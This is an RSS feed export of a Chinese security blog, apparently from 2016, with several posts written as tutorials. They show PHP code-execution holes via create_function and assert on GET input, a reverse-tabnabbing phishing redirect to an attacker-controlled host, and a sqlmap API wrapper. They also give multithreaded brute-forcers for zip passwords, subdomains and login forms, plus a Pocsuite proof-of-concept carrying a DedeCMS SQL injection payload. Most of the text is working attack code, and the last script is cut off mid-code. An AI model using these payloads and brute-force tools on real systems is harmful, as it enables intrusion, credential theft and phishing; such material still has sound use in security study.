&lt;h3 id=&#34;0x01-示例:f8e479c0998578fbaee1b58d0ce54045&#34;&gt;0x01 示例&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;示例a.php代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php
    $test = @$_GET[&#39;test&#39;];
    $newfun = create_function(&#39;$a,$b&#39;, $test);
    $newfun(&#39;1111&#39;,&#39;2222&#39;);
?&amp;gt;
上述代码中$nuwfun(&#39;1111&#39;,&#39;2222&#39;)代表此时$a=&#39;1111&#39;,$b=&#39;2222&#39;,然后将其传给$test
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_create_function1.png&#34; alt=&#34;示例1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_create_function2.png&#34; alt=&#34;示例2&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_create_function3.png&#34; alt=&#34;示例3&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-函数assert:f8e479c0998578fbaee1b58d0ce54045&#34;&gt;0x02 函数assert()&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;这个函数和eval()的作用差不多&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php @assert($_GET[&#39;str&#39;]); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/code_execution_assert.png&#34; alt=&#34;函数assert()&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>利用_blank属性钓鱼</title>
      <link>http://wyb0.com/posts/%E5%88%A9%E7%94%A8_blank%E5%B1%9E%E6%80%A7%E9%92%93%E9%B1%BC/</link>
      <pubDate>Wed, 12 Oct 2016 10:24:38 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/%E5%88%A9%E7%94%A8_blank%E5%B1%9E%E6%80%A7%E9%92%93%E9%B1%BC/</guid>
      <description>

&lt;h3 id=&#34;0x00-blank:05f464f55b7160d61a6b40dbc82fcab7&#34;&gt;0x00 _blank&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;_blank是html中的标签属性，如&lt;code&gt;&amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber-9.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt;&lt;/code&gt;, 但若点击HELLO打开的网页1.php中有如下代码：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;
if(window.opener){
  window.opener.location  = &amp;quot;http://xss.reber-9.com/fish.html&amp;quot;;
}
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;则原网页将转跳到&lt;a href=&#34;http://xss.reber-9.com/fish.html&#34;&gt;http://xss.reber-9.com/fish.html&lt;/a&gt; ，这就会造成钓鱼&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-简单模板:05f464f55b7160d61a6b40dbc82fcab7&#34;&gt;0x01 简单模板&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;a.html内容如下：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber-9.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;http://xss.reber-9.com/1.php&lt;/code&gt;中1.php内容如下：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt;
    &amp;lt;script&amp;gt;
        if(window.opener){
            window.opener.location = &amp;quot;http://xss.reber-9.com/fish.html&amp;quot;;
        }
    &amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;p&amp;gt;hello&amp;lt;/p&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;1.php同级下有个钓鱼模板fish.html，内容如下：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;fish&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;h2&amp;gt;This is fishing template!&amp;lt;/h2&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;点击a.html中的HELLO则会出现下面的情况，也就导致了钓鱼：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/blank.gif&#34; alt=&#34;blank钓鱼&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>SqlmapApi常用方法封装</title>
      <link>http://wyb0.com/posts/SqlmapApi%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%81%E8%A3%85/</link>
      <pubDate>Wed, 21 Sep 2016 17:37:33 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/SqlmapApi%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%E5%B0%81%E8%A3%85/</guid>
      <description>

&lt;h2 id=&#34;代码如下:70bf25f9fe7a9487dff7f73d72c8f2fd&#34;&gt;代码如下&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import threading
import requests
import json
from time import sleep

class Sqli(threading.Thread):
    &amp;quot;&amp;quot;&amp;quot;docstring for AutoSqli&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, server, target, data=&#39;&#39;, referer=&#39;&#39;, cookie=&#39;&#39;):
        threading.Thread.__init__(self)
        self.server = server[0:-1] if server[-1]==&#39;/&#39; else server
        self.target = target
        self.data = data
        self.referer = referer
        self.cookie = cookie
        self.taskid = &#39;&#39;
        self.data

    def new_task(self):
        url = &amp;quot;{}/task/new&amp;quot;.format(self.server)
        self.taskid = json.loads(requests.get(url).text)[&#39;taskid&#39;]
        if len(self.taskid)&amp;gt;0:
            print &amp;quot;Create new task,taskid is: %s&amp;quot; % self.taskid
            return True
        return False

    def set_option(self):
        headers = {&#39;Content-Type&#39;: &#39;application/json&#39;}
        option = {&amp;quot;options&amp;quot;: {
                    &amp;quot;smart&amp;quot;: True,
                    }
                 }
        url = &amp;quot;{}/option/{}/set&amp;quot;.format(self.server,self.taskid)
        resp = requests.post(url, data=json.dumps(option), headers=headers)
        return json.loads(resp.text)[&#39;success&#39;]

    def start_scan(self):
        headers = {&#39;Content-Type&#39;: &#39;application/json&#39;}
        payload = {
            &#39;url&#39;: self.target,
            &#39;data&#39;: self.data,
            &#39;cookie&#39;: self.cookie,
            &#39;referer&#39;: self.referer
        }
        url = &amp;quot;{}/scan/{}/start&amp;quot;.format(self.server,self.taskid)
        t = json.loads(requests.post(url,data=json.dumps(payload),headers=headers).text)
        if len(str(t[&#39;engineid&#39;])) &amp;gt; 0 and t[&#39;success&#39;]:
            print &amp;quot;[%s] Start scan&amp;quot; % self.taskid
            return True
        return False

    def get_status(self):
        url = &amp;quot;{}/scan/{}/status&amp;quot;.format(self.server,self.taskid)
        status = json.loads(requests.get(url).text)[&#39;status&#39;]
        if status == &#39;running&#39;:
            return &#39;running&#39;
        elif status == &#39;terminated&#39;:
            return &#39;terminated&#39;
        else:
            return &#39;error&#39;

    def get_data(self):
        url = &amp;quot;{}/scan/{}/data&amp;quot;.format(self.server,self.taskid)
        data = json.loads(requests.get(url).text)[&#39;data&#39;]
        if len(data) == 0:
            print &#39;[] not injection:\t&#39; + self.target
        else:
            print &#39;=======&amp;gt; injection:\t&#39; + self.target
            self.data = data

    def delete_task(self):
        url = &amp;quot;{}/task/{}/delete&amp;quot;.format(self.server,self.taskid)
        if json.loads(requests.get(url).text)[&#39;success&#39;]:
            print &amp;quot;[%s] Delete task&amp;quot; % self.taskid
            return True
        return False

    def write_to_file(self,msg):
        with open(&#39;result.txt&#39;,&#39;a+&#39;) as f:
            f.write(json.dumps(msg)+&#39;\n\n&#39;)

    def run(self):
        try:
            if not self.new_task():
                return False
            self.set_option()
            if not self.start_scan():
                return False
            while True:
                if self.get_status() == &#39;running&#39;:
                    sleep(10)
                elif self.get_status() == &#39;terminated&#39;:
                    break
                else:
                    break
            self.get_data()
            self.write_to_file(self.data)
            self.delete_task()
        except Exception, e:
            print e

if __name__ == &#39;__main__&#39;:
    server = &#39;http://127.0.0.1:8775&#39;
    target = &#39;http://192.168.188.134/sqli/Less-1/?id=1&#39;
    sqli = Sqli(server, target)
    sqli.start()
    sqli.join()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python爆破zip压缩包</title>
      <link>http://wyb0.com/posts/Python%E7%88%86%E7%A0%B4zip%E5%8E%8B%E7%BC%A9%E5%8C%85/</link>
      <pubDate>Tue, 20 Sep 2016 14:50:59 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E7%88%86%E7%A0%B4zip%E5%8E%8B%E7%BC%A9%E5%8C%85/</guid>
      <description>

&lt;h3 id=&#34;0x00-代码:b937e6266634cef75fcb51fa109b76e7&#34;&gt;0x00 代码&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;多线程爆破加密的zip压缩包&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import optparse
import zipfile
import threading
import Queue

queue = Queue.Queue()
lock = threading.Lock()
result = &#39;&#39;

def load_pwd(filename):
    for line in open(filename,&#39;r&#39;):
        if line:
            queue.put(line.strip())

def bruter(zipname,queue):
    global result
    zFile = zipfile.ZipFile(zipname)
    while not queue.empty():
        password = queue.get()
        try:
            zFile.extractall(pwd=password) # 解压
            lock.acquire()
            print &amp;quot;[Ok] password is: %s&amp;quot; % password
            lock.release()
            result = password
        except:
            lock.acquire()
            print &amp;quot;[Error] password not is: %s&amp;quot; % password
            lock.release()
        queue.task_done()

def main():
    parser = optparse.OptionParser()
    parser.add_option(&#39;-f&#39;, &#39;--file&#39;, dest=&#39;zipfile&#39;,
        type=&#39;string&#39;, help=&#39;Target zip file.&#39;)
    parser.add_option(&#39;-p&#39;, &#39;--pfile&#39;, dest=&#39;pwdfile&#39;,default=&#39;pass.txt&#39;,
        type=&#39;string&#39;, help=&#39;Password file.&#39;)
    parser.add_option(&#39;-t&#39;, &#39;--thread_num&#39;, dest=&#39;thread_num&#39;,default=60,
        type=&#39;int&#39;, help=&#39;Thread number.&#39;)

    (options, args) = parser.parse_args()

    if options.zipfile and options.pwdfile:
        load_pwd(options.pwdfile)
    else:
        parser.print_help()
        sys.exit(0)

    threads = []
    for x in range(options.thread_num):
        t = threading.Thread(target=bruter,args=(options.zipfile,queue,))
        t.setDaemon(True)
        t.start()
    queue.join()
    print &amp;quot;result is: %s&amp;quot; % result

if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python爆破二级域名</title>
      <link>http://wyb0.com/posts/Python%E7%88%86%E7%A0%B4%E4%BA%8C%E7%BA%A7%E5%9F%9F%E5%90%8D/</link>
      <pubDate>Mon, 12 Sep 2016 21:31:37 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E7%88%86%E7%A0%B4%E4%BA%8C%E7%BA%A7%E5%9F%9F%E5%90%8D/</guid>
      <description>

&lt;p&gt;参考：&lt;a href=&#34;https://github.com/lijiejie/subDomainsBrute&#34;&gt;https://github.com/lijiejie/subDomainsBrute&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;帮助信息:25b6c2890e0e0ea19d70887c8b08669a&#34;&gt;帮助信息&lt;/h2&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sub_domain_blast_help.png&#34; alt=&#34;帮助信息&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h2 id=&#34;代码:25b6c2890e0e0ea19d70887c8b08669a&#34;&gt;代码&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import dns.resolver
import threading
import Queue
import optparse
import sys

queue = Queue.Queue()
lock = threading.Lock()

class GetSubDomain(threading.Thread):
    &amp;quot;&amp;quot;&amp;quot;docstring for SubDomain&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, target,queue,outfile):
        threading.Thread.__init__(self)
        self.target = target
        self.queue = queue
        self.rsv = dns.resolver.Resolver()
        outfile = target + &#39;.txt&#39; if not outfile else outfile
        self.f = open(&#39;./output/&#39;+outfile,&#39;a+&#39;)
        self.ip_list = []

    def _scan(self):
        while not self.queue.empty():
            self.ip_list = []
            ips = None
            sub_domain = self.queue.get() + &#39;.&#39; + self.target
            for _ in range(3):
                try:
                    answers = self.rsv.query(sub_domain)
                    if answers:
                        for answer in answers:
                            if answer.address not in self.ip_list:
                                self.ip_list.append(answer.address)
                except dns.resolver.NoNameservers, e:
                    break
                except Exception, e:
                    pass
            if len(self.ip_list)&amp;gt;0:
                ips = &#39;,&#39;.join(self.ip_list)
                msg = sub_domain.ljust(30) + ips + &#39;\n&#39;
                lock.acquire()
                print msg
                self.f.write(msg)
                lock.release()
            self.queue.task_done()

    def run(self):
        self._scan()

def get_target(domain_list):
    targets = []
    for line in open(domain_list,&#39;r&#39;):
        if line:
            targets.append(line.strip())
    return targets

def get_sub_queue(sub_file): #得到所有子域名的queue
    for line in open(sub_file,&#39;r&#39;):
        if line:
            queue.put(line.strip())

def main():
    parser = optparse.OptionParser()
    parser.add_option(&#39;-u&#39;, &#39;--url&#39;, dest=&#39;url&#39;,
        type=&#39;string&#39;, help=&#39;Get a single top-level domain names.&#39;)
    parser.add_option(&#39;-l&#39;, &#39;--list&#39;, dest=&#39;domain_list&#39;,
        type=&#39;string&#39;, help=&#39;Top-level domain name list.&#39;)
    parser.add_option(&#39;-f&#39;, &#39;--file&#39;, dest=&#39;sub_file&#39;, default=&#39;sub.txt&#39;,
        type=&#39;string&#39;, help=&#39;Dict file used to brute sub names&#39;)
    parser.add_option(&#39;-t&#39;, &#39;--threads&#39;, dest=&#39;threads_num&#39;, default=60, 
        type=&#39;int&#39;, help=&#39;Number of threads. default = 60&#39;)
    parser.add_option(&#39;-o&#39;, &#39;--outfile&#39;, dest=&#39;outfile&#39;, default=None,
        type=&#39;string&#39;, help=&#39;Output file name. default is {target}.txt&#39;)

    (options, args) = parser.parse_args()
    if options.url:
        urls = [options.url]
    elif options.domain_list:
        urls = get_target(options.domain_list)
    else:
        parser.print_help()
        print &amp;quot;Example: &amp;quot;
        print &amp;quot;\tpython getsub.py -u baidu.com&amp;quot;
        print &amp;quot;\tpython getsub.py -l domain.txt -f sub.txt -t 50&amp;quot;
        sys.exit(0)

    for url in urls:
        get_sub_queue(options.sub_file)
        for x in xrange(1,options.threads_num+1):
            t = GetSubDomain(url,queue,options.outfile)
            t.setDaemon(True)
            t.start()
        queue.join()

if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>POC框架Pocsuite</title>
      <link>http://wyb0.com/posts/POC%E6%A1%86%E6%9E%B6Pocsuite/</link>
      <pubDate>Thu, 08 Sep 2016 20:38:45 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/POC%E6%A1%86%E6%9E%B6Pocsuite/</guid>
      <description>

&lt;h3 id=&#34;0x00-关于pocsuite:8260630bb71999ebd7ddfb899c571030&#34;&gt;0x00 关于Pocsuite&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Pocsuite 是知道创宇安全研究团队打造的一款基于漏洞与 POC 的远程漏洞验证框架。可以让我们不用考虑过多的细节，只要考虑验证代码就可以，它封装了一些我们常用的东西，比如requests，在我们平常使用requests是要考虑cookie、要考虑header，但是在框架下则不需要有这些考虑，因为这些东西框架都帮你解决了。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-简单介绍:8260630bb71999ebd7ddfb899c571030&#34;&gt;0x01 简单介绍&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;安装

&lt;ul&gt;
&lt;li&gt;使用pip install pocsuite即可安装

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/pocsuite_install.png&#34; alt=&#34;安装pocsuite&#34;&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;常用参数

&lt;ul&gt;
&lt;li&gt;-u 指定一个目标url&lt;/li&gt;
&lt;li&gt;-f 指定一个存放目标url的文件&lt;/li&gt;
&lt;li&gt;-r 指定一个存放poc的文件夹&lt;/li&gt;
&lt;li&gt;&amp;ndash;report 导出结果到html文件&lt;/li&gt;
&lt;li&gt;&amp;ndash;cookie 携带cookie&lt;/li&gt;
&lt;li&gt;&amp;ndash;referer 修改referer&lt;/li&gt;
&lt;li&gt;&amp;ndash;user-agent 修改UA&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;模式

&lt;ul&gt;
&lt;li&gt;执行一个poc有两种模式

&lt;ul&gt;
&lt;li&gt;--verify 漏洞验证模式(只是验证，不能更改服务器的东西)&lt;/li&gt;
&lt;li&gt;--attack 漏洞利用模式&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;示例

&lt;ul&gt;
&lt;li&gt;pocsuite -u &amp;ldquo;&lt;a href=&#34;http://www.xxxx.com&amp;quot;&#34;&gt;http://www.xxxx.com&amp;quot;&lt;/a&gt; -r poc_path/poc_name.py &amp;ndash;atack&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;poc编写&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;可以新建一个文件夹，命名为mypoc，里面就放你自己写的poc(当然也可以在mypoc里新建文件夹放一类poc，对poc进行分类)&lt;/li&gt;
&lt;li&gt;此时示例(对目标进行常见服务的测试，加载一类多个poc脚本)

&lt;ul&gt;
&lt;li&gt;pocsuite -u &amp;ldquo;&lt;a href=&#34;http://www.xxxx.com&amp;quot;&#34;&gt;http://www.xxxx.com&amp;quot;&lt;/a&gt; -r poc_path/server/ &amp;ndash;verify&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;poc的命名规范&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;漏洞ID_版本号_漏洞类型(其中不能有大写字母，所有符号要改为&amp;rdquo;_&amp;rdquo;),大致如下：

&lt;ul&gt;
&lt;li&gt;_xxxx_struct2_2016_s2_016_code_execution.py&lt;/li&gt;
&lt;li&gt;_xxxx_dedecms_20130715_sql_inj.py&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;poc的编写流程&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;导入pocsuite API模块&lt;/li&gt;
&lt;li&gt;创建TestPOC类&lt;/li&gt;
&lt;li&gt;填写POC信息&lt;/li&gt;
&lt;li&gt;编写_berify()方法&lt;/li&gt;
&lt;li&gt;编写_attack()方法&lt;/li&gt;
&lt;li&gt;注册类&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;0x02-实例:8260630bb71999ebd7ddfb899c571030&#34;&gt;0x02 实例&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

# 导入pocsuite的必要模块
from pocsuite.net import req # requests模块，和requests用法完全一样
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

class TestPOC(POCBase):
    &amp;quot;&amp;quot;&amp;quot;docstring for TestPOC&amp;quot;&amp;quot;&amp;quot;
    vulID            = &#39;&#39;      # VUL ID
    version          = &#39;&#39;      # 版本号,默认为1
    author           = &#39;&#39;      # POC 作者的大名
    vulDate          = &#39;&#39;      # 漏洞公开的时间,不知道就写今天
    createDate       = &#39;&#39;      # 编写 POC 的日期
    updateDate       = &#39;&#39;      # POC更新的时间,默认和编写时间一样
    references       = [&#39;&#39;]    # 漏洞地址来源,0day 不用写
    name             = &#39;&#39;      # POC 名称
    appPowerLink     = &#39;&#39;      # 漏洞厂商主页地址
    appName          = &#39;&#39;      # 漏洞应用名称
    appVersion       = &#39;&#39;      # 漏洞影响版本
    vulType          = &#39;&#39;      # 漏洞类型,类型参考见 漏洞类型规范表
    desc             = &#39;&#39;&#39; &#39;&#39;&#39; # 漏洞简要描述
    samples          = []      # 测试样例,就是用 POC 测试成功的网站url，选填
    install_requires = []      # POC 第三方模块依赖，请尽量不要使用第三方模块

    def _verify(self, verify=True): # 漏洞测试代码
        result = {}
        target_url = self.url

        # 这里写入漏洞测试代码
        path = &amp;quot;/plus/recommend.php&amp;quot;
        payload = &amp;quot;?action=&amp;amp;aid=1&amp;amp;_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select md5(512341)),5,6,7,8,9%23@`\\%27`+&amp;amp;_FILES[type][name]=1.jpg&amp;amp;_FILES[type][type]=application/octet-stream&amp;amp;_FILES[type][size]=4294&amp;quot;
        html = req.get(target_url + path + payload, timeout=10).content
        if &#39;5e8523b1645e6225001b9027cddc1c85&#39; in html:
            result[&#39;VerifyInfo&#39;] = {}
            result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url + path
            result[&#39;VerifyInfo&#39;][&#39;Path&#39;] = path
            result[&#39;VerifyInfo&#39;][&#39;Payload&#39;] = payload
        
        return self.parse_attack(result)

    def _attack(self): # 漏洞利用代码
        # result = {}
        # # 先进行检测是否存在漏洞
        # if not self._verify(verify=False):
        #     return self.parse_attack(result)
        # target_url = self.url

        # # 这里写漏洞利用代码

        # return self.parse_attack(result)
        
        return self._verify() # 如果没漏洞利用代码，可以直接return测试函数

    def parse_attack(self, result): # poc输出函数，可以输出错误和成功信息
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail(&#39;Nothing returned&#39;)
        return output

register(TestPOC) #注册类
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-关于poc中result字典的内容:8260630bb71999ebd7ddfb899c571030&#34;&gt;0x03 关于poc中result字典的内容&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;# result是一个字典，里面存储所有的漏洞信息:
result：{
    &#39;DBInfo&#39;: {
        &#39;Username&#39;: &#39;管理员用户名&#39;,
        &#39;Password&#39;：&#39;管理员密码&#39;,
        &#39;Salt&#39;: &#39;加密盐值&#39;,
        &#39;Uid&#39;: &#39;用户ID&#39;,
        &#39;Groupid&#39;: &#39;用户组ID&#39;
        }
    &#39;ShellInfo&#39;: {
        &#39;URL&#39;: &#39;Webshell地址&#39;,
        &#39;Content&#39;: &#39;Webshell内容&#39;
        }
    &#39;FileInfo&#39;: {
        &#39;Filename&#39;: &#39;文件名称&#39;,
        &#39;Content&#39;: &#39;文件内容&#39;
        }
    &#39;XSSInfo&#39;: {
        &#39;URL&#39;: &#39;验证URL&#39;,
        &#39;Payload&#39;: &#39;验证Payload&#39;
        }
    &#39;AdminInfo&#39;: {
        &#39;Uid&#39;: &#39;管理员ID&#39;,
        &#39;Username&#39;: &#39;管理员用户名&#39;,
        &#39;Password&#39;: &#39;管理员密码&#39;
        }
    &#39;Database&#39;: {
        &#39;Hostname&#39;: &#39;数据库主机名&#39;,
        &#39;Username&#39;: &#39;数据库用户名&#39; ,
        &#39;Password&#39;: &#39;数据库密码&#39;,
        &#39;DBname&#39;: &#39;数据库名&#39;
        }
    &#39;VerifyInfo&#39;: {
        &#39;URL&#39;: &#39;验证URL&#39;,
        &#39;Postdata&#39;: &#39;验证POST数据&#39;,
        &#39;Path&#39;: &#39;网站绝对路径&#39;
        }
    &#39;SiteAttr&#39;: {
        &#39;Process&#39;: &#39;服务器进程&#39;
        }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python实现表单爆破</title>
      <link>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E8%A1%A8%E5%8D%95%E7%88%86%E7%A0%B4/</link>
      <pubDate>Mon, 05 Sep 2016 23:43:22 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E8%A1%A8%E5%8D%95%E7%88%86%E7%A0%B4/</guid>
      <description>

&lt;h2 id=&#34;接收变量的php脚本如下:ce6886490f9a6e6169f210150773b52d&#34;&gt;接收变量的php脚本如下&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;//代码仅供测试
&amp;lt;?php
    $name = @$_POST[&#39;uname&#39;];
    $pass = @$_POST[&#39;upass&#39;];

    if (empty($name) or empty($pass)){
        header(&amp;quot;location:http://127.0.0.1:921/test/test/index.html&amp;quot;);
        exit();
    } else {
        if ($name === &#39;admin&#39; and $pass === &#39;123456&#39;){
            header(&amp;quot;location:http://127.0.0.1:921/test/test/sucess.html&amp;quot;);
        } else {
            header(&amp;quot;location:http://127.0.0.1:921/test/test/error.html&amp;quot;);
            exit();
        }
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;爆破表单的python脚本如下:ce6886490f9a6e6169f210150773b52d&#34;&gt;爆破表单的python脚本如下&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import hashlib
import requests
from Queue import Queue
import threading
from optparse import OptionParser
from time import sleep

lock = threading.Lock()
queue = Queue()
result = []

class FormBlast(threading.Thread):
    &amp;quot;&amp;quot;&amp;quot;docstring for FormBlast&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *arg):
        super(FormBlast, self).__init__()
        (options,args,queue) = arg
        self.url = options.url
        self.fname = options.fname
        self.fpass = options.fpass
        self.args = args
        self.queue = queue
        self.s = requests.Session()
        self.base_md5 = &#39;&#39;

    def get_payload(self, vname, vpass):
        dict2 = {}
        if self.args:
            for x in self.args:
                (key,value) = x.split(&#39;=&#39;)
                dict2[key] = value
        dict1 = {self.fname: vname, self.fpass: vpass}
        payload = dict(dict1, **dict2)
        return payload

    def get_md5(self, html):
        md5 = hashlib.md5()
        md5.update(html)
        return md5.hexdigest()

    def get_base_md5(self):
        proxy = {
            &#39;http&#39;: &#39;http://127.0.0.1:8080&#39;
        }
        payload = self.get_payload(&#39;1&#39;, &#39;1&#39;)
        resp = self.s.post(self.url, data=payload)
        resp.coding = resp.apparent_encoding
        html = resp.text
        self.base_md5 = self.get_md5(html)

                        
    def run(self):
        # global result
        self.get_base_md5()
        while not self.queue.empty():
            (user,pwd) = self.queue.get().split(&#39;:&#39;)
            payload = self.get_payload(user,pwd)
            try:
                resp = self.s.post(self.url, data=payload, timeout=10)
                resp.coding = resp.apparent_encoding
                code = resp.status_code
                html = resp.text
                curr_md5 = self.get_md5(html)

                if curr_md5 != self.base_md5 and code==200:
                    s = &amp;quot;[Ok] User:%s Pass:%s&amp;quot; % (user,pwd)
                    result.append(s)
                    lock.acquire()
                    print s
                    lock.release()
                    self.queue.task_done()
                else:
                    error = &amp;quot;[Error] User:%s Pass:%s&amp;quot; % (user,pwd)
                    lock.acquire()
                    print error
                    lock.release()
                    self.queue.task_done()
            except requests.exceptions.ConnectTimeout:
                self.queue.put(user+&#39;:&#39;+pwd)
            except:
                pass
